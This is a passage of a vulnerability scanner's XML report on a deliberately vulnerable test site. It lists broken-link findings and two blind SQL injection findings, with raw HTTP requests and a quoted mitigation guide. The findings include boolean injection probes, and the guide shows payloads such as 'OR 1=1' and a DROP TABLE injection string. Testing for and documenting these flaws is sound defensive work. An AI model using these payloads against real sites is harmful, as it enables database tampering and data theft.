Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 404 Not Found
Server: nginx/1.4.1
Date: Mon, 02 Feb 1970 21:45:46 GMT
Content-Type: text/html
Connection: keep-alive
Original-Content-Encoding: gzip
Content-Length: 570
]]></Response>
       </TechnicalDetails>
       <CWE id="16"><![CDATA[CWE-16]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:N/I:N/A:N]]></Descriptor>
          <Score><![CDATA[0.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no impact to the confidentiality of the system.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[]]></Descriptor>
          <Score><![CDATA[]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[]]></AV>
          <AVdesc><![CDATA[]]></AVdesc>
          <AC><![CDATA[]]></AC>
          <ACdesc><![CDATA[]]></ACdesc>
          <PR><![CDATA[]]></PR>
          <PRdesc><![CDATA[]]></PRdesc>
          <UI><![CDATA[]]></UI>
          <UIdesc><![CDATA[]]></UIdesc>
          <S><![CDATA[]]></S>
          <Sdesc><![CDATA[]]></Sdesc>
          <C><![CDATA[]]></C>
          <Cdesc><![CDATA[]]></Cdesc>
          <I><![CDATA[]]></I>
          <Idesc><![CDATA[]]></Idesc>
          <A><![CDATA[]]></A>
          <Adesc><![CDATA[]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
      <References></References>
      </ReportItem>

      <ReportItem id="19" color="green">
       <Name><![CDATA[Broken links]]></Name>
       <ModuleName><![CDATA[Crawler]]></ModuleName>
       <Details><![CDATA[For a complete list of URLs linking to this file, go to Site Structure &gt; Locate and select the file (marked as &quot;Not Found&quot;) &gt; select Referrers Tab from the bottom of the Information pane.]]></Details>
       <Affects><![CDATA[/secured/office_files/filelist.xml]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[info]]></Severity>
       <Type><![CDATA[Informational]]></Type>
       <Impact><![CDATA[Problems navigating the site.]]></Impact>
       <Description><![CDATA[A broken link refers to any link that should take you to a document, image or webpage, that actually results in an error. This page was linked from the website but it is inaccessible.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Remove the links to this file or make it accessible.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /secured/office_files/filelist.xml HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Referer: http://testphp.vulnweb.com/secured/office.htm
Acunetix-Aspect: enabled
Acunetix-Aspect-Password: 082119f75623eb7abd7bf357698ff66c
Acunetix-Aspect-Queries: aspectalerts
Cookie: mycookie=3
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 404 Not Found
Server: nginx/1.4.1
Date: Mon, 02 Feb 1970 21:45:46 GMT
Content-Type: text/html
Connection: keep-alive
Original-Content-Encoding: gzip
Content-Length: 570
]]></Response>
       </TechnicalDetails>
       <CWE id="16"><![CDATA[CWE-16]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:N/I:N/A:N]]></Descriptor>
          <Score><![CDATA[0.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no impact to the confidentiality of the system.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[]]></Descriptor>
          <Score><![CDATA[]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[]]></AV>
          <AVdesc><![CDATA[]]></AVdesc>
          <AC><![CDATA[]]></AC>
          <ACdesc><![CDATA[]]></ACdesc>
          <PR><![CDATA[]]></PR>
          <PRdesc><![CDATA[]]></PRdesc>
          <UI><![CDATA[]]></UI>
          <UIdesc><![CDATA[]]></UIdesc>
          <S><![CDATA[]]></S>
          <Sdesc><![CDATA[]]></Sdesc>
          <C><![CDATA[]]></C>
          <Cdesc><![CDATA[]]></Cdesc>
          <I><![CDATA[]]></I>
          <Idesc><![CDATA[]]></Idesc>
          <A><![CDATA[]]></A>
          <Adesc><![CDATA[]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
      <References></References>
      </ReportItem>

      <ReportItem id="20" color="red">
       <Name><![CDATA[Blind SQL Injection]]></Name>
       <ModuleName><![CDATA[Scripting (Blind_Sql_Injection.script)]]></ModuleName>
       <Details><![CDATA[Path Fragment (suffix /) input <b><font color="dark">-</font></b> was set to <b><font color="dark">3 AND 3*2*1=6 AND 703=703</font></b><br/><br/>Tests performed: <ul><li>1*1*1*3 =&gt; <b>TRUE</b></li><li>3*703*698*0 =&gt; <b>FALSE</b></li><li>13*5*2*999 =&gt; <b>FALSE</b></li><li>3*1*1 =&gt; <b>TRUE</b></li><li>1*1*1*1*1*3 =&gt; <b>TRUE</b></li><li>13*1*1*0*1*1*703 =&gt; <b>FALSE</b></li><li>3 AND 5*4=20 AND 703=703 =&gt; <b>TRUE</b></li><li>3 AND 5*4=21 AND 703=703 =&gt; <b>FALSE</b></li><li>3 AND 5*6&lt;26 AND 703=703 =&gt; <b>FALSE</b></li><li>3 AND 7*7&gt;48 AND 703=703 =&gt; <b>TRUE</b></li><li>3 AND 3*2*0=6 AND 703=703 =&gt; <b>FALSE</b></li><li>3 AND 3*2*1=6 AND 703=703 =&gt; <b>TRUE</b></li></ul><br/> Original value: <b>3</b>]]></Details>
       <Affects><![CDATA[/]]></Affects>
       <Parameter><![CDATA[-]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[An attacker may execute arbitrary SQL statements on the vulnerable system. This may compromise the integrity of your database and/or expose sensitive information. <br/><br/>Depending on the back-end database in use, SQL injection vulnerabilities lead to varying levels of data/system access for the attacker. It may be possible to not only manipulate existing queries, but to UNION in arbitrary data, use sub selects, or append additional queries. In some cases, it may be possible to read in or write out to files, or to execute shell commands on the underlying operating system.<br/><br/>Certain SQL Servers such as Microsoft SQL Server contain stored and extended procedures (database server functions). If an attacker can obtain access to these procedures it may be possible to compromise the entire machine.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to SQL Injection attacks.<br/><br/>
SQL injection is a vulnerability that allows an attacker to alter back-end SQL statements by manipulating the user input. An SQL injection occurs when web applications accept user input that is directly placed into a SQL statement and doesn't properly filter out dangerous characters. <br/> <br/> This is one of the most common application layer attacks currently being used on the Internet.  Despite the fact that it is relatively easy to protect against, there is a large number of web applications vulnerable.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from  SQL Injection Attacks by Example - http://www.unixwiz.net/techtips/sql-injection.html</i>
<h2>SQL injection mitigations</h2>

<p>We believe that web application developers often simply do not think about &quot;surprise inputs&quot;, but security people do (including the bad guys), so there are three broad approaches that can be applied here.</p>

<h2>Sanitize the input</h2>
<p>It's absolutely vital to sanitize user inputs to insure that they do not contain dangerous codes, whether to the SQL server or to HTML itself. One's first idea is to strip out &quot;bad stuff&quot;, such as quotes or semicolons or escapes, but this is a misguided attempt. Though it's easy to point out some dangerous characters, it's harder to point to all of them.</p>
<p>The language of the web is full of special characters and strange markup (including alternate ways of representing the same characters), and efforts to authoritatively identify all &quot;bad stuff&quot; are unlikely to be successful.</p>
<p>Instead, rather than &quot;remove known bad data&quot;, it's better to &quot;remove everything but known good data&quot;: this distinction is crucial. Since - in our example - an email address can contain only these characters: </p>
<code><pre wrap="virtual">
    abcdefghijklmnopqrstuvwxyz
    ABCDEFGHIJKLMNOPQRSTUVWXYZ
    0123456789
    @.-_+
</pre></code>

<p>There is really no benefit in allowing characters that could not be valid, and rejecting them early - presumably with an error message - not only helps forestall SQL Injection, but also catches mere typos early rather than stores them into the database. </p>

<p>Be aware that &quot;sanitizing the input&quot; doesn't mean merely &quot;remove the quotes&quot;, because even &quot;regular&quot; characters can be troublesome. In an example where an integer ID value is being compared against the user input (say, a numeric PIN): </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM table
     WHERE id = 23 OR 1=1;  -- Boom! Always matches!
</pre></code>
<p>In practice, however, this approach is highly limited because there are so few fields for which it's possible to outright exclude many of the dangerous characters. For &quot;dates&quot; or &quot;email addresses&quot; or &quot;integers&quot; it may have merit, but for any kind of real application, one simply cannot avoid the other mitigations. </p>

<h2>Escape/Quotesafe the input</h2>
<p>Even if one might be able to sanitize a phone number or email address, one cannot take this approach with a &quot;name&quot; field lest one wishes to exclude the likes of Bill O'Reilly from one's application: a quote is simply a valid character for this field.</p>
<p>One includes an actual single quote in an SQL string by putting two of them together, so this suggests the obvious - but wrong! - technique of preprocessing every string to replicate the single quotes:</p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = 'Bill O''Reilly';  -- works OK
</pre></code>    
<p>However, this naive approach can be beaten because most databases support other string escape mechanisms. MySQL, for instance, also permits \' to escape a quote, so after input of \'; DROP TABLE users; -- is &quot;protected&quot; by doubling the quotes, we get: </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = '\''; DROP TABLE users; --';  -- Boom!
</pre></code>    
<p>The expression '\'' is a complete string (containing just one single quote), and the usual SQL shenanigans follow. It doesn't stop with backslashes either: there is Unicode, other encodings, and parsing oddities all hiding in the weeds to trip up the application designer.</p>
<p>Getting quotes right is notoriously difficult, which is why many database interface languages provide a function that does it for you. When the same internal code is used for &quot;string quoting&quot; and &quot;string parsing&quot;, it's much more likely that the process will be done properly and safely.</p>
<p>Some examples are the MySQL function <b>mysql_real_escape_string()</b> and perl DBD method <b>$dbh-&gt;quote($value)</b>. These methods must be used. </p>

<h2>Use bound parameters (the PREPARE statement)</h2>
<p>Though quotesafing is a good mechanism, we're still in the area of &quot;considering user input as SQL&quot;, and a much better approach exists: bound parameters, which are supported by essentially all database programming interfaces. In this technique, an SQL statement string is created with placeholders - a question mark for each parameter - and it's compiled (&quot;prepared&quot;, in SQL parlance) into an internal form. Later, this prepared query is &quot;executed&quot; with a list of parameters: </p>

<b>Example in perl</b>
<code><pre wrap="virtual">    $sth = $dbh-&gt;prepare(&quot;SELECT email, userid FROM members WHERE email = ?;&quot;);
    $sth-&gt;execute($email);
</pre></code> 
<p>Thanks to Stefan Wagner, this demonstrates bound parameters in Java: </p>

<b>Insecure version</b>
<code><pre wrap="virtual">    Statement s = connection.createStatement();
    ResultSet rs = s.executeQuery(&quot;SELECT email FROM member WHERE name = &quot;
                                 + formField); // *boom*
</pre></code> 

<p><b>Secure version</b></p>
<code><pre wrap="virtual">    PreparedStatement ps = connection.prepareStatement(
        &quot;SELECT email FROM member WHERE name = ?&quot;);
    ps.setString(1, formField);
    ResultSet rs = ps.executeQuery();
</pre></code> 

<p>Here, $email is the data obtained from the user's form, and it is passed as positional parameter #1 (the first question mark), and at no point do the contents of this variable have anything to do with SQL statement parsing. Quotes, semicolons, backslashes, SQL comment notation - none of this has any impact, because it's &quot;just data&quot;. There simply is nothing to subvert, so the application is be largely immune to SQL injection attacks.</p>
 
<p>There also may be some performance benefits if this prepared query is reused multiple times (it only has to be parsed once), but this is minor compared to the enormous security benefits. This is probably the single most important step one can take to secure a web application. </p>

<h2>Limit database permissions and segregate users</h2>
<p>In the case at hand, we observed just two interactions that are made not in the context of a logged-in user: &quot;log in&quot; and &quot;send me password&quot;. The web application ought to use a database connection with the most limited rights possible: query-only access to the members table, and no access to any other table.</p>
<p>The effect here is that even a &quot;successful&quot; SQL injection attack is going to have much more limited success. Here, we'd not have been able to do the UPDATE request that ultimately granted us access, so we'd have had to resort to other avenues.</p>
<p>Once the web application determined that a set of valid credentials had been passed via the login form, it would then switch that session to a database connection with more rights.</p>
<p>It should go almost without saying that sa rights should never be used for any web-based application.</p>

<h2>Use stored procedures for database access</h2>
<p>When the database server supports them, use stored procedures for performing access on the application's behalf, which can eliminate SQL entirely (assuming the stored procedures themselves are written properly). </p>
<p>By encapsulating the rules for a certain action - query, update, delete, etc. - into a single procedure, it can be tested and documented on a standalone basis and business rules enforced (for instance, the &quot;add new order&quot; procedure might reject that order if the customer were over his credit limit). </p>
<p>For simple queries this might be only a minor benefit, but as the operations become more complicated (or are used in more than one place), having a single definition for the operation means it's going to be more robust and easier to maintain. </p>
<p><i>Note: </i>it's always possible to write a stored procedure that itself constructs a query dynamically: this provides no protection against SQL Injection - it's only proper binding with prepare/execute or direct SQL statements with bound variables that provide this protection. </p>

<h2>Isolate the webserver</h2>
<p>Even having taken all these mitigation steps, it's nevertheless still possible to miss something and leave the server open to compromise. One ought to design the network infrastructure to assume that the bad guy will have full administrator access to the machine, and then attempt to limit how that can be leveraged to compromise other things. </p>
<p>For instance, putting the machine in a DMZ with extremely limited pinholes &quot;inside&quot; the network means that even getting complete control of the webserver doesn't automatically grant full access to everything else. This won't stop everything, of course, but it makes it a lot harder. </p>

<h2>Configure error reporting</h2>
<p>The default error reporting for some frameworks includes developer debugging information, and this cannot be shown to outside users. Imagine how much easier a time it makes for an attacker if the full query is shown, pointing to the syntax error involved. </p>
<p>This information is useful to developers, but it should be restricted - if possible - to just internal users. </p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input. <br/>Check detailed information for more information about fixing this vulnerability.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /Mod_Rewrite_Shop/BuyProduct-3%20AND%203*2*1%3d6%20AND%20703%3d703/ HTTP/1.1
X-Requested-With: XMLHttpRequest
Referer: http://testphp.vulnweb.com/
Cookie: mycookie=3
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Mon, 02 Feb 1970 21:46:08 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 93
]]></Response>
       </TechnicalDetails>
       <CWE id="89"><![CDATA[CWE-89]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:M/Au:N/C:P/I:P/A:P]]></Descriptor>
          <Score><![CDATA[6.8]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Medium]]></AC>
          <ACdesc><![CDATA[The access conditions are somewhat specialized.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[Partial]]></A>
          <Adesc><![CDATA[There is reduced performance or interruptions in resource availability.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N]]></Descriptor>
          <Score><![CDATA[10]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Changed]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can affect resources beyond the authorization privileges intended by the vulnerable component. In this case the vulnerable component and the impacted component are different.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[High]]></I>
          <Idesc><![CDATA[There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix SQL Injection Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: SQL Injection tutorial]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-sql-injection-tutorial/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Injection Flaws]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Injection_Flaws]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How to check for SQL injection vulnerabilities]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection2/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[SQL Injection Walkthrough]]></Database>
          <URL><![CDATA[http://www.securiteam.com/securityreviews/5DP0N1P76E.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="21" color="red">
       <Name><![CDATA[Blind SQL Injection]]></Name>
       <ModuleName><![CDATA[Scripting (Blind_Sql_Injection.script)]]></ModuleName>
       <Details><![CDATA[Path Fragment (suffix .html) input <b><font color="dark">-</font></b> was set to <b><font color="dark">3 AND 3*2*1=6 AND 992=992</font></b><br/><br/>Tests performed: <ul><li>1*1*1*3 =&gt; <b>TRUE</b></li><li>3*992*987*0 =&gt; <b>FALSE</b></li><li>13*5*2*999 =&gt; <b>FALSE</b></li><li>3*1*1 =&gt; <b>TRUE</b></li><li>1*1*1*1*1*3 =&gt; <b>TRUE</b></li><li>13*1*1*0*1*1*992 =&gt; <b>FALSE</b></li><li>3 AND 5*4=20 AND 992=992 =&gt; <b>TRUE</b></li><li>3 AND 5*4=21 AND 992=992 =&gt; <b>FALSE</b></li><li>3 AND 5*6&lt;26 AND 992=992 =&gt; <b>FALSE</b></li><li>3 AND 7*7&gt;48 AND 992=992 =&gt; <b>TRUE</b></li><li>3 AND 3*2*0=6 AND 992=992 =&gt; <b>FALSE</b></li><li>3 AND 3*2*1=6 AND 992=992 =&gt; <b>TRUE</b></li></ul><br/> Original value: <b>3</b>]]></Details>
       <Affects><![CDATA[/]]></Affects>
       <Parameter><![CDATA[-]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[An attacker may execute arbitrary SQL statements on the vulnerable system. This may compromise the integrity of your database and/or expose sensitive information. <br/><br/>Depending on the back-end database in use, SQL injection vulnerabilities lead to varying levels of data/system access for the attacker. It may be possible to not only manipulate existing queries, but to UNION in arbitrary data, use sub selects, or append additional queries. In some cases, it may be possible to read in or write out to files, or to execute shell commands on the underlying operating system.<br/><br/>Certain SQL Servers such as Microsoft SQL Server contain stored and extended procedures (database server functions). If an attacker can obtain access to these procedures it may be possible to compromise the entire machine.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to SQL Injection attacks.<br/><br/>
SQL injection is a vulnerability that allows an attacker to alter back-end SQL statements by manipulating the user input. An SQL injection occurs when web applications accept user input that is directly placed into a SQL statement and doesn't properly filter out dangerous characters. <br/> <br/> This is one of the most common application layer attacks currently being used on the Internet.  Despite the fact that it is relatively easy to protect against, there is a large number of web applications vulnerable.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from  SQL Injection Attacks by Example - http://www.unixwiz.net/techtips/sql-injection.html</i>
<h2>SQL injection mitigations</h2>

<p>We believe that web application developers often simply do not think about &quot;surprise inputs&quot;, but security people do (including the bad guys), so there are three broad approaches that can be applied here.</p>

<h2>Sanitize the input</h2>
<p>It's absolutely vital to sanitize user inputs to insure that they do not contain dangerous codes, whether to the SQL server or to HTML itself. One's first idea is to strip out &quot;bad stuff&quot;, such as quotes or semicolons or escapes, but this is a misguided attempt. Though it's easy to point out some dangerous characters, it's harder to point to all of them.</p>
<p>The language of the web is full of special characters and strange markup (including alternate ways of representing the same characters), and efforts to authoritatively identify all &quot;bad stuff&quot; are unlikely to be successful.</p>
<p>Instead, rather than &quot;remove known bad data&quot;, it's better to &quot;remove everything but known good data&quot;: this distinction is crucial. Since - in our example - an email address can contain only these characters: </p>
<code><pre wrap="virtual">
    abcdefghijklmnopqrstuvwxyz
    ABCDEFGHIJKLMNOPQRSTUVWXYZ
    0123456789
    @.-_+
</pre></code>

<p>There is really no benefit in allowing characters that could not be valid, and rejecting them early - presumably with an error message - not only helps forestall SQL Injection, but also catches mere typos early rather than stores them into the database. </p>

<p>Be aware that &quot;sanitizing the input&quot; doesn't mean merely &quot;remove the quotes&quot;, because even &quot;regular&quot; characters can be troublesome. In an example where an integer ID value is being compared against the user input (say, a numeric PIN): </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM table
     WHERE id = 23 OR 1=1;  -- Boom! Always matches!
</pre></code>
<p>In practice, however, this approach is highly limited because there are so few fields for which it's possible to outright exclude many of the dangerous characters. For &quot;dates&quot; or &quot;email addresses&quot; or &quot;integers&quot; it may have merit, but for any kind of real application, one simply cannot avoid the other mitigations. </p>

<h2>Escape/Quotesafe the input</h2>
<p>Even if one might be able to sanitize a phone number or email address, one cannot take this approach with a &quot;name&quot; field lest one wishes to exclude the likes of Bill O'Reilly from one's application: a quote is simply a valid character for this field.</p>
<p>One includes an actual single quote in an SQL string by putting two of them together, so this suggests the obvious - but wrong! - technique of preprocessing every string to replicate the single quotes:</p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = 'Bill O''Reilly';  -- works OK
</pre></code>    
<p>However, this naive approach can be beaten because most databases support other string escape mechanisms. MySQL, for instance, also permits \' to escape a quote, so after input of \'; DROP TABLE users; -- is &quot;protected&quot; by doubling the quotes, we get: </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = '\''; DROP TABLE users; --';  -- Boom!
</pre></code>    
<p>The expression '\'' is a complete string (containing just one single quote), and the usual SQL shenanigans follow. It doesn't stop with backslashes either: there is Unicode, other encodings, and parsing oddities all hiding in the weeds to trip up the application designer.</p>
<p>Getting quotes right is notoriously difficult, which is why many database interface languages provide a function that does it for you. When the same internal code is used for &quot;string quoting&quot; and &quot;string parsing&quot;, it's much more likely that the process will be done properly and safely.</p>
<p>Some examples are the MySQL function <b>mysql_real_escape_string()</b> and perl DBD method <b>$dbh-&gt;quote($value)</b>. These methods must be used. </p>

<h2>Use bound parameters (the PREPARE statement)</h2>
<p>Though quotesafing is a good mechanism, we're still in the area of &quot;considering user input as SQL&quot;, and a much better approach exists: bound parameters, which are supported by essentially all database programming interfaces. In this technique, an SQL statement string is created with placeholders - a question mark for each parameter - and it's compiled (&quot;prepared&quot;, in SQL parlance) into an internal form. Later, this prepared query is &quot;executed&quot; with a list of parameters: </p>

<b>Example in perl</b>
<code><pre wrap="virtual">    $sth = $dbh-&gt;prepare(&quot;SELECT email, userid FROM members WHERE email = ?;&quot;);
    $sth-&gt;execute($email);
</pre></code> 
<p>Thanks to Stefan Wagner, this demonstrates bound parameters in Java: </p>

<b>Insecure version</b>
<code><pre wrap="virtual">    Statement s = connection.createStatement();
    ResultSet rs = s.executeQuery(&quot;SELECT email FROM member WHERE name = &quot;
                                 + formField); // *boom*
</pre></code> 

<p><b>Secure version</b></p>
<code><pre wrap="virtual">    PreparedStatement ps = connection.prepareStatement(
        &quot;SELECT email FROM member WHERE name = ?&quot;);
    ps.setString(1, formField);
    ResultSet rs = ps.executeQuery();
</pre></code> 

<p>Here, $email is the data obtained from the user's form, and it is passed as positional parameter #1 (the first question mark), and at no point do the contents of this variable have anything to do with SQL statement parsing. Quotes, semicolons, backslashes, SQL comment notation - none of this has any impact, because it's &quot;just data&quot;. There simply is nothing to subvert, so the application is be largely immune to SQL injection attacks.</p>
 
<p>There also may be some performance benefits if this prepared query is reused multiple times (it only has to be parsed once), but this is minor compared to the enormous security benefits. This is probably the single most important step one can take to secure a web application. </p>

<h2>Limit database permissions and segregate users</h2>
<p>In the case at hand, we observed just two interactions that are made not in the context of a logged-in user: &quot;log in&quot; and &quot;send me password&quot;. The web application ought to use a database connection with the most limited rights possible: query-only access to the members table, and no access to any other table.</p>
<p>The effect here is that even a &quot;successful&quot; SQL injection attack is going to have much more limited success. Here, we'd not have been able to do the UPDATE request that ultimately granted us access, so we'd have had to resort to other avenues.</p>
<p>Once the web application determined that a set of valid credentials had been passed via the login form, it would then switch that session to a database connection with more rights.</p>
<p>It should go almost without saying that sa rights should never be used for any web-based application.</p>

<h2>Use stored procedures for database access</h2>
<p>When the database server supports them, use stored procedures for performing access on the application's behalf, which can eliminate SQL entirely (assuming the stored procedures themselves are written properly). </p>
